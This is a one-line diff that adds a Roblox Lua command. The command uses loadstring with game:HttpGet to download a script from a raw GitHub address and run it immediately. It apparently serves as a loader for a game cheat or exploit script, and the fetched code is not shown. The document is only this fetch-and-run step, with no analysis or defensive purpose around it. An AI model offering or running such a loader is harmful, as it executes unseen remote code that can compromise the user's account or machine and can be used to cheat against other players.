@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ramaganzi31/ninjorbitreborns/main/ninjorbitagain"))()
